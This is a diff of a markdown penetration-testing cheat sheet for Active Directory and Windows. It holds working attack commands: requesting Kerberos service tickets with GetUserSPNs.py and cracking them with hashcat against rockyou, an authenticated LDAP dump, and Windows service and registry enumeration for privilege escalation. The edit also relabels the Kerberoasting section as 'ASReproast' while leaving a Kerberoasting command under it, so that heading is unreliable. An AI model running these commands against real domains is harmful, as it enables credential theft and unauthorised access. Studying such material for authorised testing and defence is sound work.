@@ -254,7 +254,7 @@ neo4j start
 ```
 
 
-#### Kerberoasting
+#### ASReproast
 
 ```
 python3 /usr/local/bin/GetUserSPNs.py domain.com/user:password -dc-ip $ip -request
@@ -267,7 +267,7 @@ hashcat -d 2 krb5tgs.txt -m 13100 -a 0 /usr/share/wordlists/rockyou.txt
 #### Test for information disclosure
 
 ```
-ldapsearch -v -H 'ldap://$ip' -x -D 'USER NAME' -w 'PASSWORD' -b 'DC=domain,DC=local'
+ldapsearch -v -H 'ldap://$ip' -x -D 'USER@DOMAIN.LOCAL' -w 'PASSWORD' -b 'DC=domain,DC=local'
 ```
 
 #### Password Spraying
@@ -683,13 +683,21 @@ reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
 accesschk.exe -qlwv C:\path\to\executeable
 ```
 
-### Unmount Disks
+### Unmount Disks/Drives
 
 ```
 mountvol
 ```
 
+```
+Get-PSdrive
+```
+
 ### Test Services
+
+```
+Get-CIMInstance -Class Win32_Service | select Name,PathName,StartMode,Started,StartName,State
+```
 
 ```
 wmic service get name,displayname,pathname,startmode
